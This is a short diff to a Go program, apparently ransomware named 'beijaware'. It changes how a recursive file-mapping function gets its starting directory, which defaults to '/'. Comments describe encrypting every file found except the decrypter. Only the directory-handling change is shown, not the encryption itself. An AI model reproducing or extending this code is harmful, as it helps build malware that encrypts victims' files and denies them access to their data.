@@ -14,7 +14,7 @@ import (
 	"github.com/dalbonip/beijaware/explorer"
 )
 
-var Dir string = "/" // Insert starting directory
+//var Dir string = "/" // Insert starting directory
 //var wg sync.WaitGroup
 
 func main() {
@@ -36,7 +36,7 @@ func main() {
 	}
 
 	//use function mapfiles from explorer (gets every file recursive by decided dir except decrypter!)
-	files := explorer.MapFiles(Dir)
+	files := explorer.MapFiles()
 
 	// for each file encrypt file with key in 644 perm
 	for _, v := range files {
